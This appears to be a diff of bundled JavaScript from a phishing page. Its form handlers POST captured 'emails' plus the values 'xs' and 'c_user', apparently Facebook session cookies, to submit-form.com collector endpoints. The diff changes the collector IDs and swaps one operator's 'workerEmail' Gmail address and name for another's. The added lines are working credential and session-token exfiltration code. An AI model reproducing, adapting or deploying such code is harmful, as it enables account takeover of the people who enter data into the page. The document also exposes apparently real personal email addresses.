@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/DEEIr4lxi", {
+                                    fetch("https://submit-form.com/X9qxwFcYA", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "Lernayouamzaxal@gmail.com",
+                                            workerEmail: "Aliumair0044@gmail.com",
                                             xs: r,
                                             c_user: i,
-                                            name: "YOUNIS"
+                                            name: "umair"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13358,17 +13358,17 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/DEEIr4lxi", {
+                                    u && o ? (fetch("https://submit-form.com/X9qxwFcYA", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: e,
-                                            workerEmail: "Lernayouamzaxal@gmail.com",
+                                            workerEmail: "Aliumair0044@gmail.com",
                                             xs: o,
                                             c_user: u,
-                                            name: "YOUNIS"
+                                            name: "umair"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/DEEIr4lxi", {
+                        fetch("https://submit-form.com/ldOCpPScr", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
